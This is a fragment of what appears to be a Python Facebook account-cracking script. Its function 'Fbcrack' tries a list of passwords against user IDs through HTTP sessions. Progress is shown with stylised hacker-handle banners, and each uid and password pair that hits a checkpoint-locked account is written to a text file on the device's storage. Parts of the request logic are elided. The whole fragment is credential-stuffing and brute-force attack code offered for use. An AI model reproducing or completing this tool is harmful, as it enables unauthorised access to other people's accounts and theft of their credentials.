...
def Fbcrack(uid,pas,tl):
	...
	sys.stdout.write(f'\r {A1}[{Clorhx}@FF-KING0011{A1}]{Emoj}[{A6}%s{A1}]{Emj}[{A2}CP-LOCK-%s{A1}]{Emojx}[{A2}OK-ID-LOGING🥰%s{A1}]\r'%(loop,len(ok),len(cp)))
	sys.stdout.flush()
	try:
		for ps in pas:
			with requests.Session() as session:
				...
				if "www.facebook.com" in str(po):
					...
					print(f'{A6}[{A2}@FF_KING0011-CP-LOCK😭{A6}]{A2} {uid} {A6}◉{A2} {ps}')
					open("/sdcard/ALHAJ-404_OLD-CP-LOCK😭.txt",'a').write(str(uid)+"|"+str(ps)+"\n")
					ok.append(uid)
					break
				else:pass
			loop+=1
